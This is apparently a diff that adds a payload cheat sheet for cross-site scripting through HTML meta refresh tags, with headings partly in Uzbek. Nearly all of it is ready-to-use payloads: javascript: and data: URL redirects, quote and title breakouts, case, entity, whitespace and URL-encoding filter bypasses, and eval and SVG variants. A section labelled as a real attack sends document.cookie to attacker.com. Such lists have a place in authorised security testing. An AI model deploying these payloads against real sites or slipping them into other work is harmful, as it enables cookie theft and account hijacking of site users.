@@ -1,0 +1,86 @@
+🔥 ULTIMATE META XSS (CLEAN)
+
+⸻
+
+1. CORE (ENG MUHIM)
+
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<meta http-equiv="refresh" content="0;javascript:alert(1)">
+
+
+⸻
+
+2. DATA URI (Juda kuchli)
+
+<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">
+<meta http-equiv="refresh" content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+
+
+⸻
+
+3. CONTEXT BREAKOUT
+
+"><meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+'><meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+
+
+⸻
+
+4. OBFUSCATION / BYPASS
+
+<meta http-equiv="refresh" content="0;url=jAvAsCrIpT:alert(1)">
+<meta http-equiv="refresh" content="0;url=javascript&colon;alert(1)">
+<meta http-equiv="refresh" content="0;url=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">
+
+
+⸻
+
+5. WHITESPACE / CONTROL BYPASS
+
+<meta http-equiv="refresh" content="0;url=jav	ascript:alert(1)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(1) ">
+<meta http-equiv="refresh" content="0;url= javascript:alert(1)">
+
+
+⸻
+
+6. MULTI-URL CONFUSION
+
+<meta http-equiv="refresh" content="0;url=http://;url=javascript:alert(1)">
+
+
+⸻
+
+7. DATA EXFILTRATION (REAL ATTACK)
+
+<meta http-equiv="refresh" content="0;url=javascript:fetch('//attacker.com?c='+document.cookie)">
+<meta http-equiv="refresh" content="0;url=javascript:location='//attacker.com?c='+document.cookie">
+
+
+⸻
+
+8. POLYGLOT
+
+</title><meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+
+
+⸻
+
+9. ENCODED
+
+%3Cmeta%20http-equiv%3Drefresh%20content%3D0%3Burl%3Djavascript%3Aalert(1)%3E
+
+
+⸻
+
+10. ADVANCED JS EXECUTION
+
+<meta http-equiv="refresh" content="0;url=javascript:eval('alert(1)')">
+<meta http-equiv="refresh" content="0;url=javascript:setTimeout(alert,0,1)">
+
+
+⸻
+
+11. HYBRID (SVG / HTML)
+
+<meta http-equiv="refresh" content="0;url=data:text/html,<svg onload=alert(1)>">
